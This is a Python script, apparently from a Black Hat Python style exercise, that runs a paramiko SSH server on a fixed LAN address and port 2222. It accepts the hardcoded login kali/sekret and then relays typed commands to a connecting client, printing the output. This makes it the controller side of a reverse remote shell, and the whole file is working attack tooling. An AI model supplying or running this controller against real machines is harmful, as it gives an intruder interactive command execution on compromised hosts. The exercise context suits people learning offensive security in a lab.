import paramiko
import os
import socket
import threading
import sys

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.even = threading.Event()

    def check_channel_request(self, kind: str, chanid: int) -> int:
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username: str, password: str) -> int:
        if (username == 'kali') and (password == 'sekret'):
            return paramiko.AUTH_SUCCESSFUL


if __name__=="__main__":
    server = '192.168.100.143'
    ssh_port = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print("[+] Listening for connecion....")
        client, addr = sock.accept()
    except Exception as e:
        print(f'[-] Listening failed: {str(e)}')
        sys.exit(1)

    else:
        print(f'[+] Got a connection : {client}:{addr}')
    
    bHSession = paramiko.Transport(client)
    bHSession.add_server_key(HOSTKEY)
    server = Server()
    bHSession.start_server(server=server)

    chan = bHSession.accept(20)
    if chan is None:
        print("***No channel!...")
        sys.exit(1)
    
    print("[+] Authenticated!")
    print(chan.recv(1024))
    chan.send("Welcome to bH_ssh")
    try:
        while True:
            command = input("Enter command: ")
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print("Exiting")
                bHSession.close()
                break
    except KeyboardInterrupt:
        bHSession.close()





